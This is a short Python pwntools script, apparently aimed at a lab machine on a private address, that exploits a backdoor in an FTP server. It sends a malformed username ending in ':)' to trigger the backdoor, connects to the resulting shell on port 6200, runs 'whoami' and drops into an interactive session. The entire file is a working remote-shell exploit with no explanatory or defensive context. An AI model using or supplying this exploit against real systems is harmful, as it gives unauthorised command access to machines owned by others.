from pwn import *

target_ip = "192.168.91.130"
ftp_port = 21  # Default FTP port

# Create a socket connection to the target
try:
    s = remote(target_ip, ftp_port)
    print("[+] Connection established")
except Exception as e:
    print(f"[-] Connection failed: {str(e)}")
    exit()

# Malformed username that triggers the backdoor
s.sendline("USER malicious:)")
s.sendline("PASS password")  # Password is usually irrelevant
print("[+] Sent malicious payload")

try:
    shell = remote(target_ip, 6200)
    print("[+] Connected to backdoor shell!")
except Exception as e:
    print(f"[-] Failed to connect to backdoor shell: {str(e)}")
    exit()

shell.sendline("whoami")
user = shell.recvline()
print(f"[+] Current user: {user.decode().strip()}")

# Interact with the shell manually
shell.interactive()

